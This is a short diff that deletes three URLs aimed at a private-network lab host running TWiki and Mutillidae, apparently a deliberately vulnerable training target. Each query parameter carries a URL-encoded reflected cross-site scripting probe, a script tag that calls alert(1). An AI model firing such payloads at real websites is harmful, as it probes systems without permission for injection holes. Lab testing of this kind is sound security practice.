@@ -1,3 +1,0 @@
-http://192.168.134.129/twiki/bin/oops/Main/WebHome?template=%3Cscript%3E%20alert(1)%20%3C/script%3E&param1=%3Cscript%3E%20alert(1)%20%3C/script%3E&param2=%3Cscript%3E%20alert(1)%20%3C/script%3E
-http://192.168.134.129/mutillidae/index.php?do=%3Cscript%3E%20alert(1)%20%3C/script%3E&page=%3Cscript%3E%20alert(1)%20%3C/script%3E
-http://192.168.134.129/mutillidae/index.php?page=%3Cscript%3E%20alert(1)%20%3C/script%3E&username=%3Cscript%3E%20alert(1)%20%3C/script%3E
